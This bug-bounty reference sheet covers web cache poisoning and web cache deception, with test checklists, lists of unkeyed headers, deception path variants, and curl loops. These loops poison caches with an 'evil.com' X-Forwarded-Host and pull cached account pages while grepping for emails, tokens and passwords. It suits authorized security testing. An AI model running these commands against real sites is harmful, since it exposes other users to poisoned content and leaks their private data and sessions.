# CACHE POISONING & WEB CACHE DECEPTION — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 18), telegram-intel, github-x-intel (H1 reports, kh4sh3i writeups), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Check cache headers (Cache-Control, X-Cache, Age, Vary)
[ ] 2. Find unkeyed inputs (headers, query params, cookies) with Param Miner
[ ] 3. Test cache poisoning: inject payload via unkeyed input → verify cached
[ ] 4. Test web cache deception: access private page with static extension → verify cached
[ ] 5. Verify impact: poisoned response served to others = High/Critical
```

---

## CACHE POISONING (Unkeyed Input Injection)

### Core Concept
```
1. Identify unkeyed input (not in cache key)
2. Send request with malicious payload in unkeyed input
3. If response cached → all subsequent users get poisoned response
```

### Unkeyed Inputs to Test

| Category | Examples |
|----------|----------|
| **Headers** | `X-Forwarded-Host`, `X-Forwarded-For`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, `Host`, `Origin`, `Referer`, `X-Forwarded-Proto`, `X-Forwarded-Ssl`, `CF-Connecting-IP`, `True-Client-IP` |
| **Query Params** | `utm_source`, `utm_medium`, `ref`, `source`, `fbclid`, `gclid`, `msclkid`, `_ga`, `session_id` (if not in key) |
| **Cookies** | `session`, `tracking`, `analytics`, `preferences` (if not in key) |
| **Path** | Trailing slash, case, encoding differences |
| **Port** | `Host: target.com:80` vs `target.com:443` |

### Detection with Param Miner (Burp)
```
1. Right-click request → Extensions → Param Miner → Guess headers
2. Param Miner automatically tests 50+ common unkeyed headers
3. Checks if header value reflected in response
4. Checks if response cached (X-Cache: HIT)
```

### Basic Poisoning Test
```bash
# 1. Send request with unkeyed header
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# 2. Check if "evil.com" reflected in response body
# 3. Send same request again (no header) → check if "evil.com" still in response (X-Cache: HIT)
# 4. If yes → CACHE POISONING!
```

### Impact Chains
```
Poisoned response reflects X-Forwarded-Host → XSS via Host header injection
Poisoned response reflects X-Forwarded-Proto → Open redirect via protocol confusion
Poisoned response reflects Referer → Referer-based XSS
Poisoned response reflects cookie → Session fixation / theft
Poisoned response reflects query param → Parameter-based XSS
Poisoned response used for link generation → Open redirect / phishing
Poisoned response used for canonical URL → SEO poisoning
Poisoned response used for CSP/OG tags → CSP bypass / social media hijack
```

### High-Value H1 Report (2025)
| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$3,800** | DoS via Cache Poisoning on cdn.shopify.com | Shopify | Unkeyed headers + path manipulation |
| **—** | Cache Poisoning → XSS/DoS | Shopify, Basecamp | Unkeyed headers + path manipulation |

---

## WEB CACHE DECEPTION (WCD)

### Core Concept
```
1. Victim accesses private page with static extension
   GET /account/settings/nonexistent.css
2. Cache sees .css → caches private response (account data)
3. Attacker requests same URL → gets victim's private data
```

### Deception Variants
```
# Path suffix
/account/settings/nonexistent.css
/account/settings/style.css
/account/settings/main.js
/account/settings/image.png

# Path traversal in suffix
/account/settings%2F..%2Fstatic.css
/account/settings%2F..%2F..%2Fstatic.css

# Semicolon delimiter
/account/settings;.css
/account/settings;.js
/account/settings;.png

# Dot delimiter
/account/settings/.css
/account/settings/.js

# Encoded variants
/account/settings%00.css
/account/settings%20.css
```

### Detection
```bash
# Check if private page cacheable
curl -s -I "https://target.com/account/settings" | grep -i "cache-control\|x-cache\|age"
# If: no Cache-Control: private + x-cache: HIT → cacheable private data

# Test deception
curl -s "https://target.com/account/settings/nonexistent.css" | grep -i "account\|settings\|email\|token"
# If private data in response → WCD!
```

---

## CACHE KEY COMPONENTS (What Affects Caching)

### Standard Cache Key
```
Scheme + Host + Port + Path + Query Params (configurable)
```

### Vary Header (Secondary Keys)
```
Vary: Accept-Encoding, User-Agent, Accept-Language, Cookie
# If present, cache separates by these values
```

### Common Cache Key Misconfigurations
```
1. Host header not in key → Host header poisoning
2. Query params not in key → Param pollution poisoning
3. Cookie not in key → Cookie-based poisoning
4. Path normalization differences → Deception
5. Port not in key → Port-based poisoning
```

---

## ADVANCED TECHNIQUES

### 1. Header Normalization Differences
```bash
# Cache normalizes, backend doesn't (or vice versa)
Host: target.com
Host: target.com:80
Host: target.com:443
Host: TARGET.COM
Host: target.com.
```

### 2. Query Parameter Normalization
```bash
# Cache ignores, backend processes
?param=value&param=value2  (HPP)
?param=value%20 vs ?param=value+
?param=value%00 vs ?param=value
```

### 3. Path Normalization
```bash
# Cache decodes, backend doesn't (or vice versa)
/path/..%2F..%2Fstatic.css
/path/;.css
/path/.css
/path%2F.css
```

### 4. Fat GET (Body in GET Request)
```bash
GET / HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 27

{"key": "malicious_value"}
# Some caches ignore body, backend processes it
```

### 5. HTTP Method Override
```bash
POST / HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET
Content-Type: application/json

{"malicious": "payload"}
# Cache sees GET, backend sees POST body
```

---

## DETECTION METHODOLOGY

### Phase 1: Cache Analysis
```bash
# 1. Check cache headers
curl -s -I "https://target.com/" | grep -i "cache-control\|expires\|age\|x-cache\|cf-cache-status\|x-cache-hits"

# 2. Identify cache technology
# Cloudflare: cf-cache-status, cf-ray
# Fastly: x-served-by, x-cache
# Akamai: x-cache, x-cache-key
# Varnish: x-varnish, age
# Nginx: x-cache, x-cache-status
# AWS CloudFront: x-cache, via

# 3. Test if response cached
curl -s "https://target.com/" -o /dev/null -w "Cache: %{http_code} %{http_version} %{size_download}\n"
curl -s "https://target.com/" -o /dev/null -w "Cache: %{http_code} %{http_version} %{size_download}\n"
# If second response faster/smaller → cached
```

### Phase 2: Unkeyed Input Discovery
```bash
# Param Miner (Burp) - automated
Right-click request → Extensions → Param Miner → Guess headers

# Manual header testing
for header in "X-Forwarded-Host" "X-Forwarded-For" "X-Host" "X-Original-URL" "X-Rewrite-URL" "Forwarded" "Origin" "Referer"; do
  curl -s -H "$header: evil.com" "https://target.com/" | grep -q "evil.com" && echo "REFLECTED: $header"
done

# Manual query param testing
for param in "utm_source" "ref" "source" "fbclid" "gclid"; do
  curl -s "https://target.com/?$param=evil.com" | grep -q "evil.com" && echo "REFLECTED: $param"
done
```

### Phase 3: Poisoning Verification
```bash
# 1. Send poison request
curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/" > /dev/null

# 2. Verify cached (send clean request)
curl -s "https://target.com/" | grep -q "evil.com" && echo "POISONED!"

# 3. Check cache headers on clean request
curl -s -I "https://target.com/" | grep -i "x-cache\|cf-cache-status\|age"
# If X-Cache: HIT or Age > 0 → cached
```

---

## CHAINS THAT PAY

```
Cache Poisoning + XSS (Host header reflected in <script src>)    → Critical
Cache Poisoning + Open Redirect (Location header poisoned)       → High
Cache Poisoning + Session Fixation (Cookie poisoned)             → Critical
Cache Poisoning + SEO Poisoning (Canonical/OG tags)              → Medium
Cache Poisoning + CSP Bypass (CSP header poisoned)               → Critical
Cache Poisoning + Subresource Integrity (SRI bypass)             → High
Web Cache Deception + PII Exposure                                → High
Web Cache Deception + Token/Session Exposure                      → Critical
Cache Poisoning + Open Redirect Chain                            → Critical
Cache Poisoning + SSRF (via poisoned URL)                        → Critical
Cache Poisoning + DoS (poison with large response)               → Medium
Cache Poisoning + XSS via Referer                                → High
Cache Poisoning + Open Redirect via Referer                      → High
```

### H1 Reports (2025)
| Bounty | Title | Program | Chain |
|--------|-------|---------|-------|
| **$3,800** | DoS via Cache Poisoning on cdn.shopify.com | Shopify | Unkeyed headers + path manipulation |
| **—** | Cache Poisoning → XSS/DoS | Shopify, Basecamp | Unkeyed headers + path manipulation |

---

## AUTOMATED TESTING (One-Liners)

```bash
# Param Miner style header testing
for header in "X-Forwarded-Host" "X-Forwarded-For" "X-Host" "X-Original-URL" "X-Rewrite-URL" "Forwarded" "Origin" "Referer" "X-Forwarded-Proto" "X-Forwarded-Ssl" "CF-Connecting-IP" "True-Client-IP"; do
  curl -s -H "$header: evil.com" "https://target.com/" | grep -q "evil.com" && echo "POISONABLE: $header"
done

# Query param testing
for param in "utm_source" "utm_medium" "ref" "source" "fbclid" "gclid" "msclkid" "_ga" "session_id"; do
  curl -s "https://target.com/?$param=evil.com" | grep -q "evil.com" && echo "POISONABLE PARAM: $param"
done

# Web Cache Deception testing
for suffix in "/nonexistent.css" "/style.css" "/main.js" "/image.png" "%2F..%2Fstatic.css" ";.css" ";.js" "/.css"; do
  curl -s "https://target.com/account/settings$suffix" | grep -qi "account\|settings\|email\|token\|password" && echo "WCD: $suffix"
done

# Cache key testing (Host header variations)
for host in "target.com" "target.com:80" "target.com:443" "TARGET.COM" "target.com."; do
  curl -s -H "Host: $host" "https://target.com/" -o /dev/null -w "$host: %{http_code} %{size_download}\n"
done

# Poisoning verification
curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/" > /dev/null
sleep 1
curl -s "https://target.com/" | grep -q "evil.com" && echo "CACHE POISONED!"

# WCD verification
curl -s "https://target.com/account/settings/nonexistent.css" | grep -qi "email\|token\|password\|ssn" && echo "WCD SUCCESS!"
```

---

## CHAINS THAT PAY (Escalation)

```
Cache Poisoning + XSS (Host header in <script src=//X-Forwarded-Host>)    → Critical
Cache Poisoning + Open Redirect (Location: //X-Forwarded-Host/path)       → High
Cache Poisoning + Session Fixation (Set-Cookie poisoned)                  → Critical
Cache Poisoning + SEO Poisoning (canonical, og:url)                       → Medium
Cache Poisoning + CSP Bypass (script-src 'self' X-Forwarded-Host)         → Critical
Cache Poisoning + SRI Bypass (integrity hash poisoned)                    → High
Web Cache Deception + PII (email, name, address)                          → High
Web Cache Deception + Token Exposure (session, api_key, csrf)             → Critical
Cache Poisoning + SSRF (poisoned URL in fetch/src)                        → Critical
Cache Poisoning + DoS (poison with 10MB response)                         → Medium
Cache Poisoning + XSS via Referer                                         → High
Cache Poisoning + Open Redirect via Referer                               → High
```

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `Param Miner` (Burp) | Automated unkeyed header/param discovery |
| `Cache-Poisoning-Scanner` | Automated cache poisoning detection |
| `WCD-Scanner` | Web cache deception scanner |
| `nuclei` templates | Cache poisoning, WCD templates |
| `ffuf` | Header/param fuzzing for poisoning |
| `curl` | Manual testing, verification |
| Burp Suite | Manual testing, Param Miner |
| Custom scripts | Cache key analysis, poisoning verification |

---

## TRIAGE DECISION TREE

```
1. Can you poison cache?
   - Unkeyed input reflected + cached → YES
   - NO → Not vulnerable

2. What impact?
   - XSS via poisoned response            → Critical
   - Open redirect via poisoned response  → High
   - Session fixation / theft             → Critical
   - PII exposure via WCD                 → High
   - Token/session exposure via WCD       → Critical
   - DoS via poisoned large response      → Medium
   - SEO poisoning                        → Low/Medium

3. Chain potential?
   + XSS → Critical
   + SSRF → Critical
   + Auth bypass → Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Poisoned but not cached (no X-Cache: HIT) | Not exploitable |
| WCD but data not sensitive (public page) | Low/Info |
| Cache-Control: private, no-store, must-revalidate | Not cacheable |
| Vary header includes all reflected inputs | Not poisonable |
| "Could poison if..." without cache verification | Theoretical = N/A |
| Poisoned response not served to other users | No impact = N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `Param Miner` (Burp) | Unkeyed header/param discovery |
| `nuclei` templates | Cache poisoning, WCD |
| `ffuf` | Header/param fuzzing |
| `curl` | Manual testing |
| `Burp Suite` | Param Miner, manual testing |
| Custom scripts | Cache key analysis, poisoning verification |
| `Cache-Poisoning-Scanner` | Automated detection |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 18 (Cache Poisoning, WCD, detection)
- telegram-intel: @bugbountyresources 100 vuln categories
- github-x-intel: H1 reports (Shopify $3.8k, Basecamp); kh4sh3i writeups (cache poisoning chains)
- bountyforge: Cache poisoning as under-hunted class, chains
- bb-methodology: Tactical Thinking (unkeyed inputs), What-If experiments
- PortSwigger: "Web Cache Poisoning" research (James Kettle), WCD labs
- HackTricks: Cache poisoning methodology
- James Kettle: "Practical Web Cache Poisoning" (Black Hat)
- OWASP: Web Cache Deception